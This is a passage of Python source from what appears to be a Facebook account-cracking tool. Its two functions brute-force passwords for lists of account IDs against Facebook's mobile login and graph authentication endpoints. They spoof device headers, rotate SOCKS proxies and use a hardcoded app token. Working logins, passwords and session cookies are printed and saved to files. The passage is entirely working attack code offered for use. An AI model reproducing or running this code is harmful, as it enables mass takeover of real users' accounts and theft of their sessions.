7_challenge%2522%253A%2522lrpl1di4hbqs6cnegooq%2522%257D&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr"
            ses.headers.update = ({'Host': 'm.facebook.com', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'dnt': '1', 'x-requested-with': 'com.facebook.katana', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-user': 'empty', 'sec-fetch-dest': 'document', 'referer': 'https://m.facebook.com/', 'accept-encoding': 'gzip, deflate br', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'})
            link = ses.get(url)
            data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'true', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1), 'encpass':'#PWD_BROWSER:0:%s:%s'%(re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),pw), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1), '__dyn': '', '__csr': '', '__req': 'h', '__a': '', '__user': '0', '_fb_noscript': 'true'}
            yusup = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
            yusup+= ';m_pixel_ratio=2.625;wd=412x756'
            head = {'authority': 'm.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'accept-language': 'en-US;q=0.9,en;q=0.8', 'content-type': 'application/x-www-form-urlencoded', 'dpr': '3.02348', 'origin': 'https://m.facebook.com', 'referer': url, 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"', 'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '""', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent':ua2, 'viewport-width': '891', 'x-asbd-id': '129477', 'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1)}
            lo = ses.post(f'https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',headers=head,data=data,cookies={'cookie': yusup},allow_redirects=False)
            if 'checkpoint' in lo.cookies.get_dict().keys():
                idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
                open('/sdcard/NOOB/RANDOM-CP.txt', 'a').write(str(idf)+'|'+str(pw)+'\n')
                cps.append(str(idf))
                break
            elif 'c_user' in ses.cookies.get_dict().keys():
                coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                coki=coki.replace("ps_l=0;ps_n=0;",'')
                try:idf = coki.split('c_user=')[1].split(';')[0]
                except:idf = ""
                print(f'\r\x1b[1;32m[NOOB-OK] {str(idf)} | {str(pw)} ')
                print("\x1b[38;5;46m[💥]\x1b[38;5;46m Cookie : "+str(coki))
                linex()
                open('/sdcard/NOOB/RANDOM-OK.txt', 'a').write(str(idf)+'|'+str(pw)+'|'+str(coki)+'\n')
                oks.append(str(idf))
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(8)
    except Exception as e:
        pass
#--------------------(RND-2)--------------------#
def tuki(idf,pwv,tl):
    global loop,oks,cps
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\x1b[38;5;160m[{bo}NOOB-XD\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46m{loop}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46m{tl}\x1b[38;5;160m]\x1b[0m-\x1b[38;5;160m[\x1b[38;5;46mOK:{str(len(oks))}\x1b[38;5;160m]");sys.stdout.flush()
    try:
        for pw in pwv:
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ua = m4_ua()
            data = {
            "adid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4()),
            "family_device_id": str(uuid.uuid4()),
            "secure_family_device_id": str(uuid.uuid4()),
            "advertiser_id": str(uuid.uuid4()),
            "method": "POST",
            "format": "json",
            "email": idf,
            "password": pw,
            "cpl": "true",
            "credentials_type": "password",
            "generate_session_cookies": "1",
            "error_detail_type": "button_with_disabled",
            "generate_machine_id": "1",
            "locale": "en_US",
            "client_country_code": "US",
            "omit_response_on_success": "false",
            "fb_api_req_friendly_name": "authenticate"}
            head = {
            "Host": "b-graph.facebook.com",
            "Authorization": "OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895",
            "x-fb-connection-bandwidth": str(random.randint(20000000, 40000000)),
            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
            "User-Agent": ua,
            "x-fb-connection-quality": "GOOD",
            "x-fb-connection-type": "MOBILE.LTE",
            "content-type": "app_authlication/x-www-form-urlencoded",
            "x-fb-http-engine": "Liger",
            "x-fb-client-IP": "True",
            "x-fb-server-cluster": "Keep-Alive",
            "Content-Type": "application/json",
            }
            url = 'https://b-gr'+'aph.face'+'book.co'+'m/au'+'th/lo'+'gin'
            po = requests.post(url,data=data,headers=head,proxies=proxs).json()
            if 'session_key' in po:
                coki =  ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                idf = po['uid']
                print(f'\r\x1b[1;32m[NOOB-OK] {str(idf)} | {str(pw)} ')
                print("\x1b[38;5;46m[💥]\x1b[38;5;46m Cookie : "+str(coki))
                linex()
                open('/sdcard/NOOB/RANDOM-OK.txt', 'a').write(str(idf)+'|'+str(pw)+'|'+str(coki)+'\n')
                oks.append(str(idf))
                break
            elif 'www.facebook.com' in po['error']['message']:
                idf = po['error']['error_data']['uid']
                open('/sdcard/NOOB/RANDOM-CP.txt', 'a').write(str(idf)+'|'+str(pw)+'\n')
                cps.append(str(idf))
                break
            else:
                continue
        loop+=1
    except Exception as e:
        pass
#-----------------------[ SYSTEM-CONTROL ]--------------------#
menu()
